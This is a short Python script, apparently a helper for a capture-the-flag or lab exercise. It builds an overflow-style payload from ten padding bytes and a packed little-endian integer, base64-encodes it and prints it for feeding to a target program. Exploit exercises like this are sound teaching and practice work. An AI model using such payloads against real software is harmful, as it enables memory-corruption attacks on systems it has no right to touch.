
import sys
import struct
import base64

buf = b'pppppppppp'
buf += struct.pack('<I', 1020682026)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
